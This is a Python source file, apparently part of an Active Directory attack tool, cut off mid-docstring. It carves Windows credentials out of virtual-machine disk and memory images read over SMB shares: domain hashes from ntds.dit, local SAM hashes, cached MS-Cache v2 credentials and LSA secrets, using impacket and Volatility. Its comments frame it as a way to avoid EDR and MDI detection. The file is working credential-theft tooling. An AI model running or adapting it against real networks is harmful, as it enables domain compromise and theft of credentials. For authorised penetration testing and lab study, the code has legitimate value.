"""Native credential extraction from virtual-machine disk and memory artifacts.

This service turns a VM disk image (``.vmdk`` / ``.vhdx`` / ``.vhd`` / ``.vdi`` /
``.avhdx``) or memory image (``.vmem`` / ``.vmsn`` / ``.vmrs`` / ``.bin`` raw RAM)
found on a filesystem into Windows credentials, fully offline and without touching
any live process on the target.

OPSEC note (see skill ``adscan-ad-constraints`` § 11): reading credentials out of a
snapshot artifact is the EDR/MDI-safe alternative to live LSASS dumping or DCSync —
no process on the running Domain Controller is touched, no DRSUAPI replication is
issued. It is the offline equivalent of the "shadow copy + parsing" technique.

Layering (single vendored dep + isolated decrypt):

* **Container access** — ``dissect`` (``dissect.hypervisor`` follows the VMware
  sparse snapshot chain / Hyper-V VHDX, ``dissect.ntfs`` walks the volume), pure
  Python, no root, no mount, no subprocess. Pulls ``ntds.dit`` + the registry hives
  out of the guest filesystem.
* **Registry hive parsing** — SYSTEM bootkey + local SAM hashes via impacket's
  ``LocalOperations`` / ``SAMHashes`` in-process (same isolated, swappable decrypt
  layer as NTDS; pypykatz is the architecture-preferred vendored lib and slots in
  behind the same interface once its offline-parser handle-lifetime bug is fixed).
* **NTDS.dit parsing** — the ESE database is read and the domain NT/LM hashes are
  decrypted behind :class:`NtdsSecretsExtractor`, an isolated, swappable interface.
  The current implementation reuses impacket's proven ``NTDSHashes`` decrypt logic
  **in-process** (no subprocess); a fully-native ``dissect.esedb`` + ported PEK/RC4
  /AES decrypt is the documented end-state behind the same interface.

All heavy parsing here is CPU-bound and synchronous; callers in the async pipeline
must invoke it via ``asyncio.to_thread`` so it never blocks the event loop. The
network transport that feeds a *remote* artifact (sparse SMB reads via aiosmb) is a
separate, async concern handled by the caller — this module operates on a
random-access binary stream or a local path and is transport-agnostic.
"""

from __future__ import annotations

from dataclasses import dataclass, field, replace
from typing import Any, BinaryIO, Callable
import importlib
import importlib.util
import json
import os
import shutil
import subprocess
import sys
import tempfile

from adscan_internal import print_info, print_info_debug, telemetry
from adscan_internal.rich_output import mark_sensitive
from adscan_internal.services.base_service import BaseService

# Guest-relative paths of the credential-bearing artifacts inside a Windows volume.
_NTDS_GUEST_PATH = "Windows/NTDS/ntds.dit"
_SYSTEM_GUEST_PATH = "Windows/System32/config/SYSTEM"
_SAM_GUEST_PATH = "Windows/System32/config/SAM"
_SECURITY_GUEST_PATH = "Windows/System32/config/SECURITY"

# Artifact extension classes. A disk image is cracked open with dissect; a memory
# image is carved for LSASS with pypykatz. ``.vmsn`` accompanies a ``.vmem`` (VMware
# splits config/state from RAM) — it is only useful paired with its ``.vmem``.
DISK_IMAGE_EXTENSIONS: tuple[str, ...] = (
    ".vmdk",
    ".vhdx",
    ".vhd",
    ".vdi",
    ".avhdx",
    ".qcow2",
)
# Formats that are ALWAYS differencing/snapshot disks referencing a parent — a
# single-stream sparse read can never reconstruct them, so they go straight to the
# chain path (fetch the chain locally, let dissect resolve the parent).
_ALWAYS_CHAINED_EXTENSIONS: tuple[str, ...] = (".avhdx",)
MEMORY_IMAGE_EXTENSIONS: tuple[str, ...] = (
    ".vmem",
    ".vmrs",
    ".bin",
    ".vmss",
    ".sav",
)

# Volatility 3 credential plugins. The CLI requires the ``.ClassName`` suffix and the
# module path moved across versions (``windows.hashdump`` → ``windows.registry.hashdump``),
# so each logical plugin lists candidate names tried in order until one is recognised.
# (Volatility's credential plugins also require ``pycryptodome`` installed, or they
# silently fail to register — pinned as a runtime dependency.)
_VOL_HASHDUMP_PLUGINS: tuple[str, ...] = (
    "windows.registry.hashdump.Hashdump",
    "windows.hashdump.Hashdump",
)
_VOL_CACHEDUMP_PLUGINS: tuple[str, ...] = (
    "windows.registry.cachedump.Cachedump",
    "windows.cachedump.Cachedump",
)
_VOL_LSADUMP_PLUGINS: tuple[str, ...] = (
    "windows.registry.lsadump.Lsadump",
    "windows.lsadump.Lsadump",
)


@dataclass(frozen=True)
class VMCredential:
    """One credential recovered from a VM artifact.

    ``kind`` is one of ``domain`` (from ntds.dit), ``local`` (from the SAM hive),
    ``machine`` (the ``$MACHINE.ACC`` / computer account from the SECURITY hive),
    ``lsa_secret`` (an LSA secret / service password), or ``lsass`` (carved from a
    memory image). NT/LM hashes are uppercase hex; ``secret`` carries a plaintext
    when one was recovered (LSA auto-logon, DPAPI-decrypted value, …).
    """

    kind: str
    principal: str
    rid: int | None = None
    nt_hash: str | None = None
    lm_hash: str | None = None
    secret: str | None = None
    source: str = ""


@dataclass(frozen=True)
class VMArtifactExtractionResult:
    """Outcome of one VM artifact credential-extraction run."""

    source_path: str
    artifact_kind: str  # "disk" | "memory" | "unsupported"
    handled: bool
    credentials: list[VMCredential] = field(default_factory=list)
    bootkey: str | None = None
    notes: list[str] = field(default_factory=list)
    error_message: str | None = None
    # True when the guest carried an NTDS.dit (a Domain Controller snapshot) — the
    # caller routes this to DCSync-style handling (selector + batch). False for a
    # normal server/workstation, routed to Backup-Operators-style hive handling.
    has_ntds: bool = False


def windows_path_to_admin_share(path: str) -> tuple[str, str]:
    """Translate a Windows path into ``(smb_share, relative_path)`` for SMB reads.

    Filesystem-discovery transports (WinRM ``Get-ChildItem``, MSSQL ``xp_dirtree``)
    yield absolute ``C:\\…`` paths, but the native SMB sparse reader addresses
    files as ``\\\\host\\share\\rel``. This maps either form to a share + relative
    path so a disk discovered by ANY transport is read over SMB:

    * ``C:\\backups\\dc.vhd``     → ``("C$", "backups\\dc.vhd")``
    * ``\\\\host\\all\\dc.vhd``   → ``("all", "dc.vhd")``
    * ``backups\\dc.vhd``         → ``("", "backups\\dc.vhd")`` (already share-relative)
    """
    normalized = str(path or "").strip().replace("/", "\\")
    if normalized.startswith("\\\\"):
        parts = normalized.lstrip("\\").split("\\", 2)
        if len(parts) >= 2:
            return parts[1], (parts[2] if len(parts) > 2 else "")
        return "", normalized
    if len(normalized) >= 2 and normalized[1] == ":":
        drive = normalized[0].upper()
        rest = normalized[3:] if normalized[2:3] == "\\" else normalized[2:]
        return f"{drive}$", rest
    return "", normalized.lstrip("\\")


def classify_vm_artifact(path: str) -> str:
    """Classify a path by extension into ``disk`` / ``memory`` / ``unsupported``.

    Pure logic — extension only, case-insensitive, wrapper-suffix aware
    (``ntds.vhdx.bak`` → ``.vhdx``). Used by the dispatch layer to route an
    artifact to the right extractor before any bytes are fetched.
    """
    lowered = str(path or "").strip().casefold()
    # Strip a trailing wrapper suffix (.bak/.old/.tmp/...) so a renamed backup of a
    # disk image is still recognised.
    for wrapper in (".bak", ".backup", ".old", ".orig", ".tmp", ".save"):
        if lowered.endswith(wrapper):
            lowered = lowered[: -len(wrapper)]
            break
    for ext in DISK_IMAGE_EXTENSIONS:
        if lowered.endswith(ext):
            return "disk"
    for ext in MEMORY_IMAGE_EXTENSIONS:
        if lowered.endswith(ext):
            return "memory"
    return "unsupported"


class RangedReaderStream:
    """Seekable read-only binary stream backed by a ranged-read callable.

    Lets a synchronous consumer (dissect) read a remote disk image sparsely: every
    ``read``/``seek`` maps to a ranged fetch via ``read_range_fn(offset, length)``,
    so only the bytes a parser actually touches cross the wire — a 60 GB disk yields
    a few MB of real reads (partition table → MFT → ntds.dit extents). ``size`` is
    the total artifact length (from share-discovery metadata or a stat); dissect
    probes SEEK_END, so the size must be known up front without reading the image.
    """

    def __init__(self, *, size: int, read_range_fn: Callable[[int, int], bytes]) -> None:
        """Wrap a ranged-read callable as a file-like object of known ``size``."""
        self._size = int(size)
        self._read_range_fn = read_range_fn
        self._pos = 0

    def readable(self) -> bool:
        """Report the stream as readable (always)."""
        return True

    def seekable(self) -> bool:
        """Report the stream as seekable (always)."""
        return True

    def writable(self) -> bool:
        """Report the stream as non-writable (read-only forensic access)."""
        return False

    def tell(self) -> int:
        """Return the current absolute position."""
        return self._pos

    def seek(self, offset: int, whence: int = 0) -> int:
        """Move the cursor (SEEK_SET/CUR/END) and return the new position."""
        if whence == 0:
            new_pos = offset
        elif whence == 1:
            new_pos = self._pos + offset
        elif whence == 2:
            new_pos = self._size + offset
        else:
            raise ValueError(f"invalid whence: {whence}")
        if new_pos < 0:
            raise ValueError("negative seek position")
        self._pos = new_pos
        return self._pos

    def read(self, size: int = -1) -> bytes:
        """Read up to ``size`` bytes at the cursor via the ranged-read callable."""
        if size is None or size < 0:
            size = max(0, self._size - self._pos)
        size = min(size, max(0, self._size - self._pos))
        if size <= 0:
            return b""
        data = self._read_range_fn(self._pos, size)
        self._pos += len(data)
        return data

    def close(self) -> None:
        """No-op close (the underlying transport is owned by the caller)."""


class NtdsSecretsExtractor:
    """Isolated, swappable NTDS.dit secret decryptor.

    Reads an offline ``ntds.dit`` + ``SYSTEM`` hive and yields domain NT/LM hashes.
    The current backend reuses impacket's ``NTDSHashes`` decrypt logic IN-PROCESS
    (no subprocess) — proven bit-exact against GOAD. The fully-native end-state
    (``dissect.esedb`` reader + ported PEK/RC4/AES decrypt) drops the impacket
    dependency behind this same ``extract`` signature.
    """

    @staticmethod
    def _load_impacket_secretsdump() -> tuple[Any, Any]:
        """Lazily import impacket's offline NTDS API (monkeypatchable in tests)."""
        module = importlib.import_module("impacket.examples.secretsdump")
        return module.LocalOperations, module.NTDSHashes

    def extract(
        self,
        *,
        ntds_path: str,
        system_hive_path: str,
        just_user: str | None = None,
    ) -> tuple[list[VMCredential], list[str]]:
        """Decrypt domain hashes from an offline ntds.dit + SYSTEM hive.

        ``just_user`` mirrors DCSync's ``-just-dc-user``: when set, only that single
        sAMAccountName is decrypted (impacket ``NTDSHashes(justUser=...)``); when
        ``None`` the full directory is walked (the "All" path).
        """
        local_operations_cls, ntds_hashes_cls = self._load_impacket_secretsdump()
        boot_key = local_operations_cls(system_hive_path).getBootKey()

        collected: list[VMCredential] = []
        notes: list[str] = []

        def _per_secret(secret_type: Any, secret: str) -> None:
            parsed = _parse_secretsdump_ntlm_line(secret)
            if parsed is not None:
                collected.append(parsed)

        # useVSSMethod=True is REQUIRED for a flat/offline ntds.dit: it reads the ESE
        # datatable directly. The non-VSS path (useVSSMethod=False, isRemote=False)
        # assumes a live DRSUAPI ``remoteOps`` and crashes with NoneType.getDomainUsers.
        ntds = ntds_hashes_cls(
            ntds_path,
            boot_key,
            isRemote=False,
            history=False,
            noLMHash=False,
            useVSSMethod=True,
            justNTLM=True,
            printUserStatus=False,
            justUser=(just_user or None),
            perSecretCallback=_per_secret,
        )
        try:
            ntds.dump()
        finally:
            try:
                ntds.finish()
            except Exception:  # noqa: BLE001 - finish() is best-effort cleanup
                pass
        if not collected:
            notes.append("NTDS.dit parsed but yielded no NTLM hashes.")
        return collected, notes


def _parse_secretsdump_ntlm_line(
    secret: str,
    *,
    kind: str = "domain",
    source: str = "ntds.dit",
) -> VMCredential | None:
    """Parse a ``user:rid:lm:nt:::`` secretsdump line into a credential.

    Used for both NTDS (domain) and SAM (local) hash lines — they share the
    pwdump shape. Kerberos-key lines (``user:aes256-cts-...:hex``) and anything
    that is not the canonical NTLM pwdump shape are ignored.
    """
    text = str(secret or "").strip()
    if not text:
        return None
    parts = text.split(":")
    # Canonical: user:rid:lmhash:nthash::: -> at least 4 leading fields, hex hashes.
    if len(parts) < 4:
        return None
    principal, rid_text, lm_hash, nt_hash = parts[0], parts[1], parts[2], parts[3]
    if not rid_text.isdigit():
        return None
    if len(nt_hash) != 32 or len(lm_hash) != 32:
        return None
    try:
        int(nt_hash, 16)
        int(lm_hash, 16)
    except ValueError:
        return None
    return VMCredential(
        kind=kind,
        principal=principal,
        rid=int(rid_text),
        nt_hash=nt_hash.lower(),
        lm_hash=lm_hash.lower(),
        source=source,
    )


class VMArtifactService(BaseService):
    """Extract Windows credentials from VM disk/memory artifacts, fully offline."""

    def __init__(
        self,
        *,
        ntds_extractor: NtdsSecretsExtractor | None = None,
    ) -> None:
        """Initialize the VM artifact service with a swappable NTDS extractor."""
        super().__init__()
        self._ntds_extractor = ntds_extractor or NtdsSecretsExtractor()

    # -- public entry points -------------------------------------------------

    def extract_from_disk_source(
        self,
        *,
        source_path: str,
        disk_stream: BinaryIO | None = None,
        display_name: str | None = None,
        just_user: str | None = None,
    ) -> VMArtifactExtractionResult:
        """Extract credentials from a VM disk image.

        ``source_path`` is either a local path OR a label for a remote artifact
        when ``disk_stream`` is supplied. ``disk_stream`` is a seekable
        random-access binary stream (e.g. an aiosmb-backed sparse reader) so a
        multi-GB remote disk is never fully downloaded; dissect reads only the
        clusters it needs. When ``disk_stream`` is ``None`` the local
        ``source_path`` is opened directly. ``just_user`` (DC snapshots only)
        limits NTDS extraction to one sAMAccountName, mirroring DCSync's
        ``-just-dc-user``.
        """
        label = display_name or source_path
        try:
            disk_target = self._open_disk_target(
                source_path=source_path,
                disk_stream=disk_stream,
            )
        except Exception as exc:  # noqa: BLE001 - any dissect open failure is non-fatal
            telemetry.capture_exception(exc)
            return VMArtifactExtractionResult(
                source_path=label,
                artifact_kind="disk",
                handled=False,
                error_message=f"Could not open disk image: {exc}",
            )

        windows_fs = self._locate_windows_volume(disk_target)
        if windows_fs is None:
            return VMArtifactExtractionResult(
                source_path=label,
                artifact_kind="disk",
                handled=False,
                error_message="No Windows volume with an NTDS/registry layout found.",
            )

        with tempfile.TemporaryDirectory(prefix="adscan_vmartifact_") as work_dir:
            extracted = self._extract_guest_artifacts(
                windows_fs=windows_fs,
                work_dir=work_dir,
            )
            if not extracted.get("SYSTEM"):
                return VMArtifactExtractionResult(
                    source_path=label,
                    artifact_kind="disk",
                    handled=False,
                    error_message="SYSTEM hive not found in guest volume.",
                )
            return self._parse_extracted_artifacts(
                label=label,
                extracted=extracted,
                just_user=just_user,
            )

    def extract_from_smb_disk(
        self,
        *,
        shell: Any,
        domain: str,
        host: str,
        share: str,
        source_path: str,
        size: int | None = None,
        auth_username: str | None = None,
        auth_password: str | None = None,
        auth_domain: str | None = None,
        just_user: str | None = None,
    ) -> VMArtifactExtractionResult:
        """Extract credentials from a disk image on an SMB share — chain-aware.

        Dispatches by artifact type:

        * **Self-contained disk** (monolithic ``.vhd``/``.vhdx``/``.vmdk``/``.vdi``/
          ``.qcow2``) → sparse single-stream read over ONE persistent SMB session
          (only the clusters dissect touches cross the wire; one auth event, not
          hundreds). ``size`` is optional — captured at open.
        * **Snapshot / differencing chain** (Hyper-V ``.avhdx`` checkpoint over a
          parent ``.vhdx``; split / delta ``.vmdk``; backed ``.qcow2``/``.vhdx``) →
          fetch the chain members from the same share directory to a local temp dir
          and let dissect reconstruct it (``open_parent`` resolves the parent by
          relative name). ``.avhdx`` goes straight here; other formats try sparse
          first and only fall back to the chain path when the sparse read fails AND
          sibling disk files exist in the directory.

        Either way the read never contacts the live guest — it is the EDR/MDI-safe
        alternative to live LSASS/DCSync.
        """
        reader = importlib.import_module(
            "adscan_internal.services.smb_byte_reader_service"
        ).SMBByteReaderService()
        label = f"\\\\{host}\\{share}\\{source_path}"
        normalized = source_path.replace("\\", "/")
        ext = ("." + normalized.rsplit(".", 1)[-1].lower()) if "." in normalized else ""

        common = {
            "reader": reader,
            "shell": shell,
            "domain": domain,
            "host": host,
            "share": share,
            "source_path": source_path,
            "label": label,
            "auth_username": auth_username,
            "auth_password": auth_password,
            "auth_domain": auth_domain,
            "just_user": just_user,
        }

        if ext in _ALWAYS_CHAINED_EXTENSIONS:
            return self._extract_from_smb_disk_chain(**common)

        sparse_result = self._extract_from_smb_disk_sparse(size=size, **common)
        if sparse_result.handled:
            return sparse_result
        # The sparse read failed — it may be a split/delta/backed chain. Try a chain
        # reconstruction; if there is no chain, return the original sparse failure.
        chain_result = self._extract_from_smb_disk_chain(**common)
        return chain_result if chain_result.handled else sparse_result

    def _extract_from_smb_disk_sparse(
        self,
        *,
        reader: Any,
        shell: Any,
        domain: str,
        host: str,
        share: str,
        source_path: str,
        label: str,
        size: int | None,
        auth_username: str | None,
        auth_password: str | None,
        auth_domain: str | None,
        just_user: str | None,
    ) -> VMArtifactExtractionResult:
        """Sparse single-stream read for a SELF-CONTAINED disk (the fast path)."""
        try:
            with reader.open_persistent_ranged_reader(
                shell=shell,
                domain=domain,
                host=host,
                share=share,
                source_path=source_path,
                auth_username=auth_username,
                auth_password=auth_password,
                auth_domain=auth_domain,
            ) as persistent_reader:
                resolved_size = size if (size and size > 0) else persistent_reader.size
                if not resolved_size or resolved_size <= 0:
                    return VMArtifactExtractionResult(
                        source_path=label,
                        artifact_kind="disk",
                        handled=False,
                        error_message="Could not resolve remote disk size for sparse read.",
                    )
                stream = RangedReaderStream(
                    size=resolved_size, read_range_fn=persistent_reader.read_range
                )
                return self.extract_from_disk_source(
                    source_path=label, disk_stream=stream, just_user=just_user
                )
        except Exception as exc:  # noqa: BLE001 - any SMB/open failure is non-fatal
            telemetry.capture_exception(exc)
            return VMArtifactExtractionResult(
                source_path=label,
                artifact_kind="disk",
                handled=False,
                error_message=f"Persistent SMB sparse read failed: {exc}",
            )

    def _extract_from_smb_disk_chain(
        self,
        *,
        reader: Any,
        shell: Any,
        domain: str,
        host: str,
        share: str,
        source_path: str,
        label: str,
        auth_username: str | None,
        auth_password: str | None,
        auth_domain: str | None,
        just_user: str | None,
    ) -> VMArtifactExtractionResult:
        """Reconstruct a snapshot/differencing chain by fetching its members locally.

        A differencing disk references a parent by name; dissect resolves it on a
        real filesystem. So we fetch every disk-image file in the leaf's share
        directory (the chain members) into a temp dir and open the leaf there —
        dissect walks the chain. Downloads are the accepted cost for the chain case
        (the exception); self-contained disks stay sparse. Each fetch reuses a single
        persistent SMB session.
        """
        normalized = source_path.replace("\\", "/")
        dir_path = normalized.rsplit("/", 1)[0] if "/" in normalized else ""
        leaf_name = normalized.rsplit("/", 1)[-1]

        siblings = reader.list_share_directory(
            shell=shell,
            domain=domain,
            host=host,
            share=share,
            dir_path=dir_path,
            auth_username=auth_username,
            auth_password=auth_password,
            auth_domain=auth_domain,
        )
        disk_files = [name for (name, _size) in siblings if classify_vm_artifact(name) == "disk"]
        if leaf_name not in disk_files:
            disk_files.append(leaf_name)
        if len(disk_files) <= 1:
            return VMArtifactExtractionResult(
                source_path=label,
                artifact_kind="disk",
                handled=False,
                error_message=(
                    "Disk is a snapshot/differencing chain member but no parent/sibling "
                    "disk files were found in the share directory."
                ),
            )

        print_info(
            f"VM disk: '{mark_sensitive(leaf_name, 'path')}' is a snapshot/differencing "
            f"chain — fetching {len(disk_files)} chain file(s) to reconstruct offline "
            "(no live host contact)."
        )
        with tempfile.TemporaryDirectory(prefix="adscan_vmchain_") as work_dir:
            for name in disk_files:
                remote_rel = f"{dir_path}/{name}" if dir_path else name
                if not reader.download_remote_file(
                    shell=shell,
                    domain=domain,
                    host=host,
                    share=share,
                    source_path=remote_rel.replace("/", "\\"),
                    dest_path=os.path.join(work_dir, name),
                    auth_username=auth_username,
                    auth_password=auth_password,
                    auth_domain=auth_domain,
                ):
                    print_info_debug(
                        f"VM chain: could not fetch member {mark_sensitive(name, 'path')}"
                    )
            local_leaf = os.path.join(work_dir, leaf_name)
            if not os.path.isfile(local_leaf):
                return VMArtifactExtractionResult(
                    source_path=label,
                    artifact_kind="disk",
                    handled=False,
                    error_message="Failed to fetch the chain leaf disk for reconstruction.",
                )
            result = self.extract_from_disk_source(
                source_path=local_leaf, just_user=just_user
            )
            return replace(result, source_path=label)

    def extract_from_smb_memory(
        self,
        *,
        shell: Any,
        domain: str,
        host: str,
        share: str,
        source_path: str,
        auth_username: str | None = None,
        auth_password: str | None = None,
        auth_domain: str | None = None,
    ) -> VMArtifactExtractionResult:
        """Carve credentials from a VM MEMORY image on an SMB share.

        A raw guest-RAM snapshot (``.vmem`` / ``.vmrs`` / ``.dmp`` / hiberfil) needs
        broad random access (Volatility scans for the KDBG + walks page tables), so
        — unlike a sparse disk read — it is fetched in full over one persistent SMB
        session, then carved locally. This is the exact HTB-Checkpoint root step: a
        ``.vmem`` on a backup share → ``vol windows.registry.hashdump`` → local hash.
        """
        reader = importlib.import_module(
            "adscan_internal.services.smb_byte_reader_service"
        ).SMBByteReaderService()
        label = f"\\\\{host}\\{share}\\{source_path}"
        name = source_path.replace("\\", "/").rsplit("/", 1)[-1]
        with tempfile.TemporaryDirectory(prefix="adscan_vmmem_") as work_dir:
            dest = os.path.join(work_dir, name)
            print_info(
                f"VM memory image: fetching '{mark_sensitive(name, 'path')}' to carve "
                "credentials offline with Volatility 3 (no live host contact)."
            )
            if not reader.download_remote_file(
                shell=shell,
                domain=domain,
                host=host,
                share=share,
                source_path=source_path.replace("/", "\\"),
                dest_path=dest,
                auth_username=auth_username,
                auth_password=auth_password,
                auth_domain=auth_domain,
            ):
                return VMArtifactExtractionResult(
                    source_path=label,
                    artifact_kind="memory",
                    handled=False,
                    error_message="Could not download the memory image from the share.",
                )
            result = self.extract_from_memory_source(source_path=dest)
            return replace(result, source_path=label)

    def extract_from_memory_source(
        self,
        *,
        source_path: str,
    ) -> VMArtifactExtractionResult:
        """Carve credentials from a raw VM memory image via Volatility 3.

        Runs the same plugins the offline memory-forensics workflow uses:
        ``windows.registry.hashdump`` (local SAM NT hashes — the HTB-Checkpoint
        technique), ``windows.lsadump`` (LSA secrets) and ``windows.cachedump``
        (domain cached MS-Cache v2). Volatility is genuinely required here: raw
        physical RAM must be carved (KDBG/page-table walk), which pypykatz —
        a minidump/hive parser — does not do.
        """
        label = source_path
        if not os.path.isfile(source_path):
            return VMArtifactExtractionResult(
                source_path=label, artifact_kind="memory", handled=False,
                error_message="Memory image not found.",
            )
        vol_cmd = self._locate_volatility()
        if not vol_cmd:
            return VMArtifactExtractionResult(
                source_path=label, artifact_kind="memory", handled=False,
                error_message="Volatility 3 is not available in this runtime.",
            )

        credentials: list[VMCredential] = []
        notes: list[str] = []

        # 1. Local SAM hashes — the Checkpoint root step.
        for row in self._run_volatility_first(vol_cmd, source_path, _VOL_HASHDUMP_PLUGINS):
            user = str(row.get("User") or "").strip()
            nt_hash = str(row.get("nthash") or "").strip()
            if not user or not nt_hash:
                continue
            rid_raw = str(row.get("rid") or "").strip()
            credentials.append(
                VMCredential(
                    kind="local",
                    principal=user,
                    rid=int(rid_raw) if rid_raw.isdigit() else None,
                    nt_hash=nt_hash,
                    lm_hash=(str(row.get("lmhash") or "").strip() or None),
                    source="memory:SAM",
                )
            )

        # 2. Domain cached credentials (MS-Cache v2) — crackable, useful pivots.
        for row in self._run_volatility_first(vol_cmd, source_path, _VOL_CACHEDUMP_PLUGINS):
            user = str(row.get("Username") or row.get("User") or "").strip()
            mscache = str(row.get("Hash") or row.get("Domain Cached Credential") or "").strip()
            if user and mscache:
                notes.append(f"mscache2 {user}:{mscache}")

        # 3. LSA secrets — service-account plaintext / machine keys.
        for row in self._run_volatility_first(vol_cmd, source_path, _VOL_LSADUMP_PLUGINS):
            secret = str(row.get("Secret") or "").strip()
            key = str(row.get("Key") or row.get("Name") or "").strip()
            if key and secret:
                notes.append(f"lsa-secret {key}")

        handled = bool(credentials)
        return VMArtifactExtractionResult(
            source_path=label,
            artifact_kind="memory",
            handled=handled,
            has_ntds=False,
            credentials=credentials,
            notes=notes,
            error_message=None if handled else "No credentials recovered from the memory image.",
        )

    @staticmethod
    def _locate_volatility() -> list[str] | None:
        """Resolve a Volatility 3 invocation.

        Volatility runs as a subprocess tool (like netexec/impacket), installed in a
        dedicated ``tool_venv`` in the runtime image (shared by PRO + LITE), so the
        container path is checked first; then ``PATH`` (dev ``uv`` venv); then the
        ``volatility3.cli`` module (dev fallback).
        """
        adscan_home = os.environ.get("ADSCAN_HOME", "/opt/adscan")
        for candidate in (
            os.path.join(adscan_home, "tool_venvs", "volatility3", "venv", "bin", "vol"),
            os.path.join(adscan_home, "bin", "vol"),
        ):
            if os.path.isfile(candidate):
                return [candidate]
        for name in ("vol", "vol3", "volatility3"):
            found = shutil.which(name)
            if found:
                return [found]
        try:
            if importlib.util.find_spec("volatility3.cli") is not None:
                return [sys.executable, "-m", "volatility3.cli"]
        except (ImportError, ValueError):
            pass
        return None

    def _run_volatility_first(
        self,
        vol_cmd: list[str],
        image_path: str,
        plugin_candidates: tuple[str, ...],
        timeout_seconds: int = 1200,
    ) -> list[dict[str, Any]]:
        """Run the first RECOGNISED plugin name from the candidates; return its rows.

        ``_run_volatility`` returns ``None`` when a plugin name is unknown/failed (so
        we fall through to the next candidate) versus ``[]`` when it ran with no rows
        (so we stop and accept the empty result — no wasted re-runs on a 2 GB image).
        """
        for plugin in plugin_candidates:
            rows = self._run_volatility(vol_cmd, image_path, plugin, timeout_seconds)
            if rows is not None:
                return rows
        return []

    def _run_volatility(
        self,
        vol_cmd: list[str],
        image_path: str,
        plugin: str,
        timeout_seconds: int = 1200,
    ) -> list[dict[str, Any]] | None:
        """Run one Volatility 3 plugin (JSON). Rows on success (possibly empty); None
        when the plugin name is unknown / the run failed, so the caller can try another
        candidate name."""
        command = [*vol_cmd, "-q", "-r", "json", "-f", image_path, plugin]
        try:
            proc = subprocess.run(  # noqa: S603 - fixed argv, no shell
                command,
                capture_output=True,
                text=True,
                timeout=timeout_seconds,
                check=False,
            )
        except Exception as exc:  # noqa: BLE001 - a failed plugin is non-fatal
            telemetry.capture_exception(exc)
            print_info_debug(f"Volatility plugin {plugin} failed: {exc}")
            return None
        stdout = (proc.stdout or "").strip()
        if not stdout:
            # vol renders ``[]`` for an empty-but-valid result; no stdout means the
            # plugin name was rejected (unknown) — signal failure to try the next.
            return [] if proc.returncode == 0 else None
        try:
            data = json.loads(stdout)
        except (ValueError, TypeError):
            return None
        if not isinstance(data, list):
            return None
        return [row for row in data if isinstance(row, dict)]

    # -- dissect container access (CPU-bound, run under asyncio.to_thread) ----

    @staticmethod
    def _load_dissect_target() -> Any:
        """Lazily import dissect.target (monkeypatchable, optional at import time)."""
        module = importlib.import_module("dissect.target")
        return module.Target

    def _open_disk_target(
        self,
        *,
        source_path: str,
        disk_stream: BinaryIO | None,
    ) -> Any:
        """Open a dissect Target from a local path or a random-access stream.

        A ``disk_stream`` (e.g. a :class:`RangedReaderStream` over aiosmb sparse
        reads) is attached as a dissect container — only the clusters dissect
        touches are fetched, never the whole image. NOTE: a path-less stream is
        only sufficient for a SELF-CONTAINED disk image (monolithic ``.vhdx`` /
        ``.vhd`` / monolithic ``.vmdk``). A split/snapshot-chain VMware disk
        resolves its extents + parent by sibling filename and cannot be read from a
        single stream — those must be fetched locally (handled by the caller).
        """
        target_cls = self._load_dissect_target()
        if disk_stream is not None:
            container_open = importlib.import_module("dissect.target.container").open
            target = target_cls()
            target.disks.add(container_open(disk_stream))
            target.apply()
            return target
        return target_cls.open(source_path)

    @staticmethod
    def _locate_windows_volume(disk_target: Any) -> Any:
        """Return the NTFS filesystem holding the NTDS/registry layout, or None."""
        for filesystem in getattr(disk_target, "filesystems", []) or []:
            try:
                if filesystem.path(_NTDS_GUEST_PATH).exists():
                    return filesystem
                if filesystem.path(_SYSTEM_GUEST_PATH).exists():
                    return filesystem
            except Exception:  # noqa: BLE001 - non-Windows / unreadable volume
                continue
        return None

    def _extract_guest_artifacts(
        self,
        *,
        windows_fs: Any,
        work_dir: str,
    ) -> dict[str, str]:
        """Copy ntds.dit + hives out of the guest volume into ``work_dir``."""
        wanted = {
            "ntds.dit": _NTDS_GUEST_PATH,
            "SYSTEM": _SYSTEM_GUEST_PATH,
            "SAM": _SAM_GUEST_PATH,
            "SECURITY": _SECURITY_GUEST_PATH,
        }
        extracted: dict[str, str] = {}
        for name, guest_path in wanted.items():
            try:
                guest_file = windows_fs.path(guest_path)
                if not guest_file.exists():
                    continue
                local_path = os.path.join(work_dir, name)
                with guest_file.open() as src, open(local_path, "wb") as dst:
                    while True:
                        chunk = src.read(1024 * 1024)
                        if not chunk:
                            break
                        dst.write(chunk)
                extracted[name] = local_path
            except Exception as exc:  # noqa: BLE001 - one missing artifact is non-fatal
                telemetry.capture_exception(exc)
                print_info_debug(
                    f"VM artifact: could not extract {name}: {mark_sensitive(str(exc), 'detail')}"
                )
        return extracted

    # -- parsing layer (SYSTEM bootkey + SAM hives + NTDS decrypt) -----------

    def _parse_extracted_artifacts(
        self,
        *,
        label: str,
        extracted: dict[str, str],
        just_user: str | None = None,
    ) -> VMArtifactExtractionResult:
        """Parse extracted hives (bootkey + SAM) and ntds.dit (NtdsSecretsExtractor)."""
        credentials: list[VMCredential] = []
        notes: list[str] = []
        bootkey: str | None = None

        hive_creds, bootkey, hive_notes = self._parse_hives(extracted)
        credentials.extend(hive_creds)
        notes.extend(hive_notes)

        has_ntds = bool(extracted.get("ntds.dit"))
        if has_ntds:
            try:
                domain_creds, ntds_notes = self._ntds_extractor.extract(
                    ntds_path=extracted["ntds.dit"],
                    system_hive_path=extracted["SYSTEM"],
                    just_user=just_user,
                )
                credentials.extend(domain_creds)
                notes.extend(ntds_notes)
            except Exception as exc:  # noqa: BLE001 - NTDS parse failure is non-fatal
                telemetry.capture_exception(exc)
                notes.append(f"NTDS.dit parsing failed: {exc}")

        deduped = _dedupe_credentials(credentials)
        return VMArtifactExtractionResult(
            source_path=label,
            artifact_kind="disk",
            handled=True,
            credentials=deduped,
            bootkey=bootkey,
            notes=notes,
            has_ntds=has_ntds,
        )

    def _parse_hives(
        self,
        extracted: dict[str, str],
    ) -> tuple[list[VMCredential], str | None, list[str]]:
        """Parse the SYSTEM bootkey and SAM local hashes via impacket (in-process).

        Uses impacket's ``LocalOperations`` (bootkey) + ``SAMHashes`` (local account
        NT/LM) — the same in-process decrypt path as :class:`NtdsSecretsExtractor`,
        proven against GOAD. (pypykatz's offline registry parser is the
        architecture-preferred vendored lib, but its sync ``OffineRegistry`` closes
        its hive handle before parsing — "seek of closed file" — so it is deferred
        behind this interface until that lifetime bug is fixed upstream/vendored.)
        The domain machine account is recovered authoritatively from ntds.dit
        (e.g. ``KINGSLANDING$`` RID 1001), so the SECURITY/$MACHINE.ACC LSA path is
